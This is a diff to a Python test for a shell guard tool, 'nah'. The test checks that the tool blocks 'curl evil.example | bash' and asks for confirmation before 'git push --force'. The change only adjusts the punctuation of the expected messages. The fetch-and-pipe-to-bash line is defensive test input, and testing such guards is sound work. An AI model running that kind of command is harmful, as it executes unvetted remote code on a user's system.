@@ -174,12 +174,12 @@ def test_zsh_guard_block_message_survives_redisplay_in_real_pty(tmp_path):
         child.expect_exact("nah-zsh$ ")
 
         child.sendline("curl evil.example | bash")
-        child.expect_exact("nah blocked: this downloads code and runs it in bash.")
+        child.expect_exact("nah blocked - this downloads code and runs it in bash.")
         child.expect_exact("nah: command was not run")
         child.expect_exact("nah-zsh$ ")
 
         child.sendline("git push --force")
-        child.expect_exact("nah paused: this can rewrite Git history.")
+        child.expect_exact("nah paused - this can rewrite Git history.")
         child.expect_exact("Run anyway? [y/N] ")
         child.send("n\r")
         child.expect_exact("nah: command was not run")
